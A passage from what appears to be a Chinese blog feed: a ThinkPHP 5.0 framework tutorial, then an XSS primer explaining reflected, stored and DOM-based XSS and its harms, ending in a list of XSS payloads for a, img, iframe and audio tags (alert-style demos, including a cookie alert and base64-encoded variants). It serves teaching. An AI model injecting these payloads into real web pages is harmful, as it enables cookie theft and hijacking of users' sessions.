定义文件</span><br><span class="line">35.│  ├─console.php        控制台入口文件</span><br><span class="line">36.│  ├─convention.php     惯例配置文件</span><br><span class="line">37.│  ├─helper.php         助手函数文件（可选）</span><br><span class="line">38.│  ├─LICENSE.txt        授权说明文件</span><br><span class="line">39.│  ├─phpunit.xml        单元测试配置文件</span><br><span class="line">40.│  ├─README.md          README 文件</span><br><span class="line">41.│  └─start.php          框架引导文件</span><br><span class="line">42.├─build.php             自动生成定义文件（参考）</span><br><span class="line">43.├─composer.json         composer 定义文件</span><br><span class="line">44.├─LICENSE.txt           授权说明文件</span><br><span class="line">45.├─README.md             README 文件</span><br><span class="line">46.├─think                 命令行入口文件</span><br></pre></td></tr></table></figure>



<h2 id="2、配置文件（重点）"><a href="#2、配置文件（重点）" class="headerlink" title="2、配置文件（重点）"></a>2、配置文件（重点）</h2><p>（见手册–配置）</p>
<p>①三个层级的配置文件：</p>
<p>框架主配置文件（惯例配置文件） thinkphp&#x2F;convention.php </p>
<p>应用公共配置文件 application&#x2F;config.php， application&#x2F;database.php 对整个应用生效</p>
<p>模块配置文件 application&#x2F;模块目录&#x2F;config.php 对当前模块生效</p>
<p> ②其他说明：</p>
<p>配置文件格式 return array( 键值对 );</p>
<p>加载顺序： 框架主配置文件 》 应用公共配置文件 》 模块配置文件</p>
<p>配置文件生效顺序： 后加载的生效（后加载的配置项会覆盖之前配置项）</p>
<p>如果要手动进行配置，一般不要修改框架本身的主配置文件，</p>
<p>而是在应用或者模块配置文件中进行配置。</p>
<h2 id="3、函数文件"><a href="#3、函数文件" class="headerlink" title="3、函数文件"></a>3、函数文件</h2><p>框架助手函数文件 thinkphp&#x2F;helper.php</p>
<p>应用公共函数文件 application&#x2F;common.php</p>
<p>模块函数文件 application&#x2F;模块目录&#x2F;common.php</p>
<p>一般不建议直接修改thinkphp&#x2F;helper.php</p>
<h2 id="4、开发规范（了解）"><a href="#4、开发规范（了解）" class="headerlink" title="4、开发规范（了解）"></a>4、开发规范（了解）</h2><p>TP框架编码规范：见手册–基础–开发规范</p>
<p>扩展：PSR代码规范：<a href="https://www.kancloud.cn/thinkphp/php-fig-psr/3139">https://www.kancloud.cn/thinkphp/php-fig-psr/3139</a></p>
<h1 id="四、TP框架中的控制器"><a href="#四、TP框架中的控制器" class="headerlink" title="四、TP框架中的控制器"></a>四、TP框架中的控制器</h1><h2 id="1、控制器的后缀"><a href="#1、控制器的后缀" class="headerlink" title="1、控制器的后缀"></a>1、控制器的后缀</h2><p>打开配置文件application&#x2F;config.php，有如下配置</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;controller_suffix&#x27;</span> =&gt; <span class="literal">false</span>,</span><br></pre></td></tr></table></figure>

<p>表示默认情况下，控制器无特殊后缀。例如 Index控制器，文件名为Index.php</p>
<p>如果需要进行设置，可以设置为（我们不需要这么设置）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;controller_suffix&#x27;</span> =&gt; <span class="string">&#x27;Controller&#x27;</span>,</span><br></pre></td></tr></table></figure>

<p>表示控制器以Controller为后缀。例如Index控制器，文件名为IndexController.php</p>
<h2 id="2、控制器的定义"><a href="#2、控制器的定义" class="headerlink" title="2、控制器的定义"></a>2、控制器的定义</h2><p>（见手册–控制器–控制器定义）</p>
<p>1）定义位置及命名规则</p>
<p>定义位置：application&#x2F;模块目录&#x2F;controller&#x2F;目录下</p>
<p>命名规则：控制器名称（首字母大写） + (控制器后缀，默认没有) + .php</p>
<p>默认：Index控制器  Index.php</p>
<p>  User控制器   User.php</p>
<p>  Test控制器    Test.php</p>
<p>示例：</p>
<p>2）编写控制器</p>
<p>①声明命名空间  namespace  app\模块目录名\controller</p>
<p>②引入控制器基类（可选） use think\Controller; think是命名空间 Controller是基类控制器</p>
<p>③定义当前控制器类，继承控制器基类（可选）</p>
<p>示例：定义测试控制器Test.php</p>
<h2 id="3、框架中的命名空间"><a href="#3、框架中的命名空间" class="headerlink" title="3、框架中的命名空间"></a>3、框架中的命名空间</h2><p>命名空间本身是PHP就有的，用来防止命名冲突问题的。</p>
<p>TP框架中的命名空间，通常和目录挂钩。</p>
<p>原因：TP中的自动加载机制，会将类的命名空间作为加载路径的一部分。 </p>
<p>TP中命名空间使用：</p>
<p>①声明命名空间 使用namespace关键字</p>
<p>②引入指定的类 使用use关键字  命名空间\类名称</p>
<p>③完全限定式访问  在使用类时，\完整命名空间\类名称（继承和实例化）</p>
<p>如果一个类没有命名空间，使用 \类名</p>
<h2 id="4、url访问"><a href="#4、url访问" class="headerlink" title="4、url访问"></a>4、url访问</h2><p>（见手册–架构–URL访问）</p>
<p>ThinkPHP5.0框架中，默认使用PATH_INFO方式的url进行访问。</p>
<p>示例：<a href="http://www.tpshop.com/index.php/Home/Test/index/page/10">http://www.tpshop.com/index.php/Index/Test/index/page/10</a></p>
<p>格式：<a href="http://域名/%E5%85%A5%E5%8F%A3%E6%96%87%E4%BB%B6?m=%E5%88%86%E7%BB%84%E5%90%8D&c=%E6%8E%A7%E5%88%B6%E5%99%A8%E5%90%8D%E7%A7%B0&a=%E6%93%8D%E4%BD%9C%E6%96%B9%E6%B3%95%E5%90%8D%E7%A7%B0&%E5%8F%82%E6%95%B0%E5%90%8D=%E5%8F%82%E6%95%B0%E5%80%BC">http:&#x2F;&#x2F;域名&#x2F;入口文件&#x2F;模块名&#x2F;控制器名称&#x2F;操作方法名称&#x2F;参数名&#x2F;参数值</a></p>
<p>隐藏入口文件写法：<a href="http://域名/%E5%85%A5%E5%8F%A3%E6%96%87%E4%BB%B6?m=%E5%88%86%E7%BB%84%E5%90%8D&c=%E6%8E%A7%E5%88%B6%E5%99%A8%E5%90%8D%E7%A7%B0&a=%E6%93%8D%E4%BD%9C%E6%96%B9%E6%B3%95%E5%90%8D%E7%A7%B0&%E5%8F%82%E6%95%B0%E5%90%8D=%E5%8F%82%E6%95%B0%E5%80%BC">http:&#x2F;&#x2F;域名&#x2F;模块名&#x2F;控制器名称&#x2F;操作方法名称&#x2F;参数名&#x2F;参数值</a></p>
<p>需要对apache进行设置（手册–架构–URL访问、手册–部署–URL重写）</p>
<p>使用PHPStudy需要将 public目录的.htaccess文件中，index.php后面加上? </p>
<p>使用Apapche的重写机制隐藏入口文件后，如果在整个url后面加上.html后缀, 让整个url看起来像是访问的静态页面。这叫做“伪静态”。</p>
<h2 id="5、调试模式"><a href="#5、调试模式" class="headerlink" title="5、调试模式"></a>5、调试模式</h2><p>（见手册–错误与调试–调试模式）</p>
<p>默认情况下，如果代码有误（比如控制器名拼写有误），会出现以下错误：</p>
<p>错误描述比较模糊，不方便进行错误调试。这种模式通常叫做“部署模式”（生产模式）。</p>
<p>开发阶段可以将框架设置为调试模式，便于进行错误调试：</p>
<p>修改 项目目录\application目录\config.php </p>
<p>开启调试模式后，报错信息格式如下：</p>
<p>会提示详细错误信息 和 错误位置（参考位置）。</p>
<p>相对于 线上环境（开发完成后的阶段），叫做 部署模式或者生产模式。</p>
<h1 id="五、创建模块"><a href="#五、创建模块" class="headerlink" title="五、创建模块"></a>五、创建模块</h1><h2 id="1、创建前台和后台模块"><a href="#1、创建前台和后台模块" class="headerlink" title="1、创建前台和后台模块"></a>1、创建前台和后台模块</h2><p>一个典型的应用是由多个模块组成的（通常有前台网站模块和后台管理系统模块），这些模块通常都是应用目录下面的一个子目录，每个模块都有自己独立的配置文件、公共文件和类库文件。</p>
<p>我们给项目创建home（前台）和admin（后台）两个模块：</p>
<h2 id="2、设置默认访问模块"><a href="#2、设置默认访问模块" class="headerlink" title="2、设置默认访问模块"></a>2、设置默认访问模块</h2><p>打开配置文件application&#x2F;config.php，有如下配置</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;default_module&#x27;</span> =&gt; <span class="string">&#x27;index&#x27;</span>,</span><br></pre></td></tr></table></figure>

<p>表示默认访问模块为index模块</p>
<p>可以更改默认模块为home模块</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;default_module&#x27;</span> =&gt; <span class="string">&#x27;home&#x27;</span>,</span><br></pre></td></tr></table></figure>



<h1 id="六、命令行创建模块目录及文件"><a href="#六、命令行创建模块目录及文件" class="headerlink" title="六、命令行创建模块目录及文件"></a>六、命令行创建模块目录及文件</h1><p>在 <strong>项目根目录</strong> 执行命令（think文件所在的目录）</p>
<h2 id="1、命令行创建模块目录"><a href="#1、命令行创建模块目录" class="headerlink" title="1、命令行创建模块目录"></a>1、命令行创建模块目录</h2><p>（见手册 – 命令行 – 自动生成目录结构）</p>
<p>通常可以通过以下命令，自动生成模块目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php think build --module 模块名</span><br></pre></td></tr></table></figure>

<p>比如：创建test模块目录，执行命令 php think build –module test即可。（模块名小写）</p>
<h2 id="2、命令行创建控制器"><a href="#2、命令行创建控制器" class="headerlink" title="2、命令行创建控制器"></a>2、命令行创建控制器</h2><p>（见手册 – 命令行 – 创建类库文件）</p>
<p>通常可以通过以下命令，自动创建控制器</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php think make:controller 模块名/控制器名 </span><br><span class="line">php think make:controller 模块名/控制器名 --plain</span><br></pre></td></tr></table></figure>

<p>加上 –plain 参数 表示创建没有方法的空控制器类。否则控制器类中会自带一些方法。</p>
<p>比如：创建home模块Index控制器，执行命令 php think make:controller home&#x2F;Index即可。</p>
<p>注意：控制器名首字母大写。</p>
<h2 id="3、命令行创建模型"><a href="#3、命令行创建模型" class="headerlink" title="3、命令行创建模型"></a>3、命令行创建模型</h2><p>（见手册 – 命令行 – 创建类库文件）</p>
<p>通常可以通过以下命令，自动创建模型</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php think make:model 模块名/模型名</span><br></pre></td></tr></table></figure>

<p>比如：创建home模块User模型，执行命令 php think make:model home&#x2F;User即可。</p>
<p>注意：模型名首字母大写。</p>
<h1 id="七、Request请求类"><a href="#七、Request请求类" class="headerlink" title="七、Request请求类"></a>七、Request请求类</h1><h2 id="1、获取输入变量"><a href="#1、获取输入变量" class="headerlink" title="1、获取输入变量"></a>1、获取输入变量</h2><p>（见手册–请求–输入变量）</p>
<p>要获取当前的请求信息，可以使用\think\Request类</p>
<p>$request &#x3D; \think\Request::instance();</p>
<p>或者使用助手函数</p>
<p>$request &#x3D; request();</p>
<p>也可以单独获取get变量或者post变量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Request::instance()-&gt;get();</span><br><span class="line">Request::instance()-&gt;post();</span><br><span class="line">input(&#x27;get.&#x27;);</span><br><span class="line">input(&#x27;post.&#x27;);</span><br></pre></td></tr></table></figure>

<p>代码示例：</p>
<p>浏览器访问效果：</p>
<p>特殊说明：路由变量与get变量</p>
<p><a href="http://www.tpshop.com/home/test/index/id/100?page=10">http://www.tpshop.com/home/test/index/id/100?page=10</a></p>
<p>param方法 能够获取所有参数（id, page）</p>
<p>get方法 只能获取?后面的请求字符串的参数（page）</p>
<p>route方法 只能获取到?前面的路由中的参数（id）</p>
<h2 id="2、参数绑定"><a href="#2、参数绑定" class="headerlink" title="2、参数绑定"></a>2、参数绑定</h2><p>（见手册–请求–参数绑定）</p>
<p>方法参数绑定是把URL地址（或者路由地址）中的变量作为操作方法的参数直接传入。</p>
<p>使用示例：home模块Test控制器read方法中，声明$id参数</p>
<p>访问url中，传递id参数  <a href="http://www.tpshop.com/home/test/read/id/100">http://www.tpshop.com/home/test/read/id/100</a></p>
<h2 id="3、依赖注入"><a href="#3、依赖注入" class="headerlink" title="3、依赖注入"></a><strong>3、依赖注入</strong></h2><p>（见手册–请求–依赖注入）</p>
<p>依赖注入：简单的说，要在一个类A中使用另一个依赖类B时，不直接在类A中实例化类B，而是先实例化类B后再以参数的形式传入类A.</p>
<p>补充说明：Request请求类中，封装了很多和请求相关的方法，详情见手册–请求（多看）</p>
<p>小结：</p>
<p>可以找到任何一种方法 接收请求参数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1.获取请求对象  </span></span><br><span class="line"><span class="variable">$request</span> = <span class="title function_ invoke__">request</span>();</span><br><span class="line"><span class="variable">$request</span> = \think<span class="title class_">\Request</span>::<span class="title function_ invoke__">instance</span>();</span><br><span class="line"><span class="variable">$request</span> = <span class="variable language_">$this</span>-&gt;request; <span class="comment">//仅限于继承了底层控制器的情况下</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params">Request <span class="variable">$request</span></span>)  //依赖注入</span></span><br><span class="line"><span class="function">   //2. 接收请求参数 <span class="title">param</span>方法</span></span><br><span class="line"><span class="function">    $<span class="title">params</span> = $<span class="title">request</span>-&gt;<span class="title">param</span>(<span class="params"></span>)</span>;</span><br><span class="line">	<span class="variable">$params</span> = <span class="title function_ invoke__">input</span>();</span><br><span class="line">	<span class="variable">$params</span> = <span class="title function_ invoke__">request</span>()-&gt;<span class="title function_ invoke__">param</span>();</span><br><span class="line">	<span class="variable">$id</span> = <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">param</span>(<span class="string">&#x27;id&#x27;</span>);</span><br><span class="line">	<span class="variable">$id</span> = <span class="title function_ invoke__">input</span>(<span class="string">&#x27;id&#x27;</span>);</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">edit</span>(<span class="params"><span class="variable">$id</span></span>)//参数绑定</span></span><br></pre></td></tr></table></figure>



<h1 id="八、ThinkPHP框架中的视图"><a href="#八、ThinkPHP框架中的视图" class="headerlink" title="八、ThinkPHP框架中的视图"></a>八、ThinkPHP框架中的视图</h1><h2 id="1、视图的组成"><a href="#1、视图的组成" class="headerlink" title="1、视图的组成"></a>1、视图的组成</h2><p>View视图类（继承了自定义模板引擎，功能与Smarty类似）</p>
<p>HTML模板文件</p>
<h2 id="2、模板的定义"><a href="#2、模板的定义" class="headerlink" title="2、模板的定义"></a>2、模板的定义</h2><p>（见手册–模板–模板定位）</p>
<p>为了对模板文件更加有效的管理，ThinkPHP对模板文件进行目录划分，默认的模板文件定义规则是：视图目录&#x2F;控制器名（小写）&#x2F;操作名（小写）+模板后缀</p>
<p>默认的视图目录是模块的view目录，框架的默认视图文件后缀是.html。</p>
<p>比如home模块 Index控制器index方法要调用的模板定义为view&#x2F;index&#x2F;index.html</p>
<h2 id="3、模板渲染"><a href="#3、模板渲染" class="headerlink" title="3、模板渲染"></a>3、模板渲染</h2><p>（见手册–视图–模板渲染，手册–视图–模板赋值）</p>
<p>在控制器方法中，</p>
<p>第一种：使用assign方法进行模板赋值，使用fetch方法进行模板渲染。</p>
<p>第二种：使用助手函数view(), 进行模板渲染并赋值。</p>
<p>使用示例：</p>
<p>注：模板中输出变量值： {$模板变量名}</p>
<h1 id="九、将后台模板与框架做结合"><a href="#九、将后台模板与框架做结合" class="headerlink" title="九、将后台模板与框架做结合"></a>九、将后台模板与框架做结合</h1><p>模板整合思路：</p>
<p>①确定页面的访问路径（模块、控制器、方法）</p>
<p>②新建对应的控制器方法，在方法中调用模板</p>
<p>③将模板页面移动到对应的视图目录下（创建子目录）</p>
<p>④将静态资源文件移动到public&#x2F;static&#x2F;admin目录下</p>
<p>⑤修改模板文件中静态资源路径</p>
<p>页面分布：</p>
<p>登录页  	Login控制器login方法  login.html</p>
<p>首页		Index控制器index方法  index.html</p>
<p>商品列表	Goods控制器index方法  goods_list.html  -&gt;  index.html</p>
<p>商品新增	Goods控制器create方法  goods_add.html  -&gt; create.html</p>
<p>商品修改	Goods控制器edit方法    goods_edit.html   -&gt; edit.html</p>
<p>管理员列表	Manager控制器index方法  manager_list.html   -&gt; index.html</p>
<p>管理员新增	Manager控制器create方法  manager_add.html  -&gt; create.html</p>
<p>管理员修改	Manager控制器edit方法    manager_edit.html  -&gt;edit.html</p>
<p>…</p>
<h2 id="1、模板布局"><a href="#1、模板布局" class="headerlink" title="1、模板布局"></a>1、模板布局</h2><p>（见手册–模板–模板布局）</p>
<p>使用模板布局，就是把多个模板页面都有的公共代码给抽取出来，放到一个公共位置开发维护</p>
<p>好处：相同的代码只维护一份，减少代码工作量</p>
<p>后台全局布局设置步骤：</p>
<p>①修改配置文件application&#x2F;admin&#x2F;config.php,加入以下设置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;template&#x27;  =&gt;  [</span><br><span class="line">    &#x27;layout_on&#x27;     =&gt;  true,//开启布局</span><br><span class="line">    &#x27;layout_name&#x27;   =&gt;  &#x27;layout&#x27;,//布局文件名称</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>②将静态资源文件移动到&#x2F;public&#x2F;static&#x2F;admin目录下</p>
<p>③在application&#x2F;admin&#x2F;view目录下，新建layout.html</p>
<p>将后台页面公共的头部、底部代码提取到layout.html中，在中间位置放一个特殊字符串“{_<em>CONTENT</em>_}”，表示此位置，替换为原始要访问的页面内容。</p>
<p>layout.html文件中， 只保留所有页面<strong>公共</strong> 的css和js相关代码，修改静态资源路径</p>
<p>注： <strong>一定不能</strong> 直接将所有css和js都放在layout.html中。</p>
<p>注：TP框架中，模板中的静态资源路径，不能使用相对路径.&#x2F; ，必须使用以&#x2F;开头的路径。</p>
<p>④临时关闭模板布局</p>
<p>全局布局设置，对所有页面全部生效。</p>
<p>特殊页面（不需要使用布局的页面），可以在控制器方法中，临时关闭模板布局。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;view-&gt;engine-&gt;<span class="title function_ invoke__">layout</span>(<span class="literal">false</span>);</span><br></pre></td></tr></table></figure>

<p>比如登录页面，不需要使用布局，见 “3、后台登录页”</p>
<h2 id="2、后台首页"><a href="#2、后台首页" class="headerlink" title="2、后台首页"></a>2、后台首页</h2><p>①确定页面的访问路径（模块、控制器、方法）</p>
<p>admin模块Index控制器index方法</p>
<p>②新建对应的控制器方法，在方法中调用模板</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">admin</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">view</span>();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>③将模板页面移动到对应的视图目录下</p>
<p>index.html    &#x3D;&gt;     application&#x2F;admin&#x2F;view&#x2F;index&#x2F;index.html</p>
<p>④修改模板文件</p>
<p>保留页面独有的静态资源文件，以及主体部分代码</p>
<p>修改模板文件中静态资源路径</p>
<p><strong>注：如果页面显示效果不对，可以考虑先删除缓存 runtime目录</strong></p>
<h2 id="3、后台登录页"><a href="#3、后台登录页" class="headerlink" title="3、后台登录页"></a>3、后台登录页</h2><p>①确定页面的访问路径（模块、控制器、方法）</p>
<p>admin模块 login控制器  login方法</p>
<p>②新建对应的控制器方法，在方法中调用模板</p>
<p>注：后台的登录页面，不需要使用布局</p>
<p>③将模板页面移动到对应的视图目录下</p>
<p>将login.html 移动到 application&#x2F;admin&#x2F;view&#x2F;login&#x2F;目录下</p>
<p>⑤修改模板文件中静态资源路径</p>
<p>修改application&#x2F;admin&#x2F;view&#x2F;login&#x2F;login.html</p>
<p>注：也可以使用_<em>STATIC</em>_ 代替静态资源路径中的&#x2F;static（手册–视图–输出替换）</p>
<h2 id="4、其他页面"><a href="#4、其他页面" class="headerlink" title="4、其他页面"></a>4、其他页面</h2><p>重复步骤①②③⑤</p>
<h1 id="作业"><a href="#作业" class="headerlink" title="作业"></a>作业</h1><p>整合以下模板</p>
<p>商品列表	Goods控制器index方法  goods_list.html  -&gt;  index.html</p>
<p>商品新增	Goods控制器create方法  goods_add.html  -&gt; create.html</p>
<p>商品修改	Goods控制器edit方法    goods_edit.html   -&gt; edit.html</p>
<p>管理员列表	Manager控制器index方法  manager_list.html   -&gt; index.html</p>
<p>管理员新增	Manager控制器create方法  manager_add.html  -&gt; create.html</p>
<p>管理员修改	Manager控制器edit方法    manager_edit.html  -&gt;edit.html</p>
<h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h1><p>1.安装部署框架，熟悉目录结构（application   public）</p>
<p>2.控制器定义、控制器的访问（隐藏入口文件、Path_info格式url） 能够访问到指定的控制器方法</p>
<p>3.命令行操作（创建模块，创建控制器类）（环境变量等）</p>
<p>4.Request请求对象基本使用–接收参数（熟练使用一种写法）</p>
<p>5.模板整合（模板布局）</p>
]]></content>
  </entry>
  <entry>
    <title>xss漏洞</title>
    <url>/2023/04/23/xss%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="xss简介"><a href="#xss简介" class="headerlink" title="xss简介"></a>xss简介</h1><h2 id="定义-x2F-原理"><a href="#定义-x2F-原理" class="headerlink" title="定义&#x2F;原理"></a>定义&#x2F;原理</h2><p>跨站脚本（Cross-Site Scripting），本应该缩写为CSS，但是该缩写已被层叠样式脚本Cascading Style Sheets所用，所以改简称为XSS。也称跨站脚本或跨站脚本攻击。跨站脚本攻击XSS通过将恶意得Script代码注入到Web页面中，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。</p>
<h2 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h2><p>1.攻击者将恶意代码注入到服务器中（如论坛、留言板、邮件等）；<br>2.用户在没有防备的情况下访问了被注入了恶意代码的服务器；<br>3.服务器将含有恶意代码的网页响应给客户端；<br>4.在客户端浏览器中触发JS恶意代码</p>
<p>用户输入的地方，都可能被注入xss代码，都存在遭受xss的风险，只要没有对用户的输入进行严格过滤，就会被xss。当攻击者可以将恶意代码注入到服务器中，我们就认为其存在xss漏洞。</p>
<h2 id="XSS漏洞危害"><a href="#XSS漏洞危害" class="headerlink" title="XSS漏洞危害"></a>XSS漏洞危害</h2><p>恶意用户利用xss代码攻击成功后，可能会得到很高的权限，XSS漏洞主要有以下危害：<br>（1）盗取各种用户账号；<br>（2）窃取用户Cookie资料，冒充用户身份进入网站；<br>（3）劫持用户会话，执行任意操作；是指操作用户浏览器；<br>（4）刷流量，执行弹窗广告；<br>（5）传播蠕虫病毒。</p>
<h2 id="xss类型"><a href="#xss类型" class="headerlink" title="xss类型"></a>xss类型</h2><h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p>定义：反射型XSS是非持久性、参数型跨站脚本。反射型XSS的JS代码在web应用的参数（变量）中，如搜索框的反射型XSS。</p>
<p>特点：这种攻击方式往往具有一次性。</p>
<p>攻击方式：攻击者通过电子邮件等方式将包含xss代码的恶意链接发送给目标用户。当目标用户访问该链接时，服务器接收该目标用户的请求并进行处理，然后服务器把带有xss代码的数据发送给目标用户的浏览器，浏览器解析这段带有xss代码的恶意脚本后，就会触发xss漏洞。</p>
<h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>定义：存储型XSS是持久性跨站脚本，持久性体现在xss代码不是在某个参数（变量）中，而是写进数据库或文件等可以永久保存数据的介质中。存储型XSS通常发生在留言板等地方。我们在留言板位置留言，将恶意代码写进数据库中。</p>
<p>特点：攻击脚本将被永久地存放在目标服务器的数据库或文件中，具有很高的隐蔽性。</p>
<p>攻击方式：这种攻击多见于论坛、博客和留言板，攻击者在发帖的过程中，将恶意脚本连同正常信息一起注入帖子的内容中。随着帖子被服务器存储下来，恶意脚本也永久地被存放在服务器的后端存储器中 。 当其他用户浏览这个被注入了恶意脚本的帖子时，恶意脚本会在他们的浏览器中得到执行 。所以需要浏览器从服务器载入恶意的xss代码，才能真正触发xss。</p>
<h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><p>定义：DOM型XSS比较特殊。owasp关于DOM型XSS的定义是基于DOM的XSS是一种XSS攻击，其中攻击的payload由于修改受害者浏览器页面的DOM树而执行的。其特殊的地方就是payload在浏览器本地修改DOM树而执行，并不会传到服务器上，这也就使得DOM型XSS比较难以检测。</p>
<p>网页的生成及修改：</p>
<p>在网站页面中有许多元素，当页面到达浏览器时，浏览器会为页面创建一个顶级的Document<br>object文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件 。<br>可以通过JS脚本对文档对象进行编辑，从而修改页面的元素 。 也就是说，客户端的脚本程序可以通过DOM动态修改页面内容，从客户端获取DOM中的数据并在本地执行。由于DOM是在客户端修改节点的，所以基于DOM型的xss漏洞不需要与服务器端交互，它只发生在客户端处理数据的阶段。</p>
<p>攻击方式：用户请求一个经过专门设计的URL，它由攻击者提交，而且其中包含XSS代码。服务器的响应不会以任何形式包含攻击者的脚本。 当用户的浏览器处理这个响应时， DOM对象就会处理XSS代码，导致存在XSS漏洞 。</p>
<p>攻击代码</p>
<script>alert(/xss/)</script>  
<script>confirm(’xss‘)</script>  
<script>prompt(’xss‘)</script> 

<h2 id="xss-常见标签语句"><a href="#xss-常见标签语句" class="headerlink" title="xss 常见标签语句"></a>xss 常见标签语句</h2><h3 id="0x01-lt-a-gt-标签"><a href="#0x01-lt-a-gt-标签" class="headerlink" title="0x01. **&lt; a&gt;**标签"></a>0x01. **&lt; a&gt;**标签</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:alert(1)&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;http://baidu.com&quot; onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus=&quot;&quot;&gt;xss&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;x&quot; onclick=eval(&quot;alert(&#x27;xss&#x27;);&quot;)&gt;xss&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;x&quot; onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;x&quot; onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<h3 id="0x02-lt-img-gt-标签"><a href="#0x02-lt-img-gt-标签" class="headerlink" title="0x02. &lt; img&gt;标签"></a>0x02. &lt; img&gt;标签</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=“&#123;payload&#125;” onerror=&quot;alert(1)&quot;&gt;</span><br><span class="line">&lt;img src=x onerror=eval(&quot;alert(1)&quot;)&gt;</span><br><span class="line">&lt;img src=1 onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</span><br><span class="line">&lt;img src=1 onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</span><br><span class="line">&lt;img src=1 onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</span><br></pre></td></tr></table></figure>

<h3 id="0x03-lt-iframe-gt-标签"><a href="#0x03-lt-iframe-gt-标签" class="headerlink" title="0x03. &lt; iframe&gt;标签"></a>0x03. &lt; iframe&gt;标签</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;test&lt;/iframe&gt;</span><br><span class="line">&lt;iframe onload=&quot;alert(document.cookie)&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;iframe onload=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;iframe onload=&quot;base64,YWxlcnQoJ3hzcycpOw==&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;iframe onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;</span><br></pre></td></tr></table></figure>

<h3 id="0x04-lt-audio-gt-标签"><a href="#0x04-lt-audio-gt-标签" class="headerlink" title="0x04. &lt; audio&gt; 标签"></a>0x04. &lt; audio&gt; 标签</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;audio src=1 onerror=alert(1)&gt;</span><br><span class="line">&lt;audio&gt;&lt;source src=&quot;x&quot; onerror=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/audio&gt;</span><br><span class="line">&lt;audio controls onfocus=eval(&quot;alert(&#x27;xss&#x27;);&quot;) autofocus=&quot;&quot;&gt;&lt;/audio&gt;</span><br><span class="line">&lt;audio controls onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;source src=&quot;x&quot;&gt;&lt;/audio&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

